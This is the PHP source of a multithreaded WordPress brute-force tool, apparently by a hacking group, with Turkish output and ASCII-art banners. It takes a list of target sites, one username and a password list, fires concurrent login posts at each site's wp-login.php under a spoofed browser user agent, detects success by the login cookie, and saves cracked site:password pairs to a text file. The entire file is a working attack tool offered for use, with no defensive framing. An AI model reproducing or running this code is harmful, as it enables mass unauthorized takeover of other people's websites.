<?php 
error_reporting(0);
/*

*    Janissaries Wordpress Brute Force Tool With Pthreads

*    Coded By Arsle

*    contact for questions : arsle@janissaries.org

*    Script Language : Turkish

*    Janissaries.Org

*    wwww.Arsle.org

*/
class threadle extends Thread{
	
	public function __construct($site,$nick,$sifre,$id)
	{
		
		$this->site=$site."wp-login.php";
		$this->nick=$nick;
		$this->postdata="log=$nick&pwd=$sifre&redirect_to=".urlencode($site."/wp-admin&testcookie=1&wp-submit=Log In");
		$this->sifre=$sifre;
		$this->id=$id;
	
	}
	public function run()
	{
		$yaz=fopen('sonuc.txt','a');
		
		echo chr(27) . "[1;33m[$this->id][+]$this->site-->$this->sifre\n".chr(27) . "[0m";
		$ch = curl_init();
		curl_setopt ($ch, CURLOPT_URL,$this->site);

		curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
		curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6");
		curl_setopt ($ch, CURLOPT_TIMEOUT, 10);
		curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
		
        curl_setopt($ch,CURLOPT_HEADER,1);

        curl_setopt($ch,CURLOPT_NOBODY,1);
		curl_setopt ($ch, CURLOPT_COOKIEJAR, "cookie.txt");
		

		curl_setopt ($ch, CURLOPT_POSTFIELDS, $this->postdata);
		curl_setopt ($ch, CURLOPT_POST, 1);
		$result = curl_exec ($ch);
		
		curl_close($ch);
		
		
		
		if((preg_match("/wordpress_logged_in/",$result) and !(preg_match("/deleted/",$result))))
		{
			
			echo chr(27) . "[0;32m" . "[$this->id][+]$this->site-->Kirildi!\n" . chr(27) . "[0m";
			fwrite($yaz,"[+]$this->site:$this->sifre\n");
			
		}
		
	}
	

}





print chr(27) . "[0;36m|----------Wordpress Brute Force Tool 1.1--------------|\n". chr(27) . "[0m";
print chr(27) . "[0;36m|      _             _                    _            |\n". chr(27) . "[0m";
print chr(27) . "[0;36m|     | |           (_)                  (_)           |\n". chr(27) . "[0m";
print chr(27) . "[0;36m|     | | __ _ _ __  _ ___ ___  __ _ _ __ _  ___  ___  |\n". chr(27) . "[0m";
print chr(27) . "[0;36m| _   | |/ _` | '_ \| / __/ __|/ _` | '__| |/ _ \/ __| |\n". chr(27) . "[0m";
print chr(27) . "[0;36m|| |__| | (_| | | | | \\__ \\__ \\ (_| | |  | |  __/\\__ \\ |\n". chr(27) . "[0m";
print chr(27) . "[0;36m| \\____/ \\____|_| |_|_|___/___/\\____|_|  |_|\\___||___/ |\n". chr(27) . "[0m";
print chr(27) . "[0;36m|-------------arsle@janissaries.org--------------------|\n". chr(27) . "[0m";
print chr(27) . "[0;36m|             /\\            | |                        |\n". chr(27) . "[0m";
print chr(27) . "[0;36m|            /  \\   _ __ ___| | ___                    |\n". chr(27) . "[0m";
print chr(27) . "[0;36m|           / /\ \\ | '__/ __| |/ _ \\                   |\n". chr(27) . "[0m";
print chr(27) . "[0;36m|          / ____ \\| |  \\__ \\ |  __/                   |\n". chr(27) . "[0m";
print chr(27) . "[0;36m|         /_/    \\_\\_|  |___/_|\\___|                   |\n". chr(27) . "[0m";
print chr(27) . "[0;36m|-----------------www.arsle.org------------------------|\n". chr(27) . "[0m";
if(isset($argv[1]) and isset($argv[2]) and isset($argv[3]) and isset($argv[4]))
{
		$pool            = new Pool($argv[4]); 
		$gorevler = array(); 
		$siteliste=file_get_contents($argv[1]);
		$urls = explode(PHP_EOL,$siteliste);

		$sitesayi=count($urls);
		$sifreliste=file_get_contents($argv[3]);
		$passlist=explode(PHP_EOL,$sifreliste);

		$sifresayi=count($passlist);
		$urls=array_values(array_unique($urls));
		$urlsondurum=count($urls);
		print chr(27) . "[0;35m|---------------Thread Sayisi:$argv[4]-----------------------|\n".chr(27) . "[0m";
		print chr(27) . "[0;35m|------------------Site Sayisi:$sitesayi-----------------------|\n".chr(27) . "[0m";
		print chr(27) . "[0;35m|-----------------Sifre Sayisi:$sifresayi-----------------------|\n".chr(27) . "[0m";
		print chr(27) . "[0;35m|---------------Kullanici Adi:$argv[2]--------------------|\n".chr(27) . "[0m";
		print chr(27) . "[0;35m|-------------Tekrar Eden Site Sayisi:".($sitesayi-$urlsondurum)."----------------|\n".chr(27) . "[0m";
		print chr(27) . "[0;35m|------------Kaydedilecek Txt:sonuc.txt----------------|\n".chr(27) . "[0m";
		print chr(27) . "[0;35m|######################################################|\n".chr(27) . "[0m";
		sleep(2);
		$i=1;
		foreach($urls as $url)
		{
			
					foreach($passlist as $pass){
					$gorevler[] = new threadle($url,$argv[2],$pass,$i++);
					}
		}
		 

		 
		foreach($gorevler as $gorev)
		{
			$pool->submit($gorev);
		 
		} 
		 
		$pool->shutdown();
}
		else
		{
			echo "Kullanim:php $argv[0] sitelist.txt username passlist.txt thread\n";
		}
print chr(27) . "[0;36m|##################Coded By Arsle######################|\n".chr(27) . "[0m";

 

?>
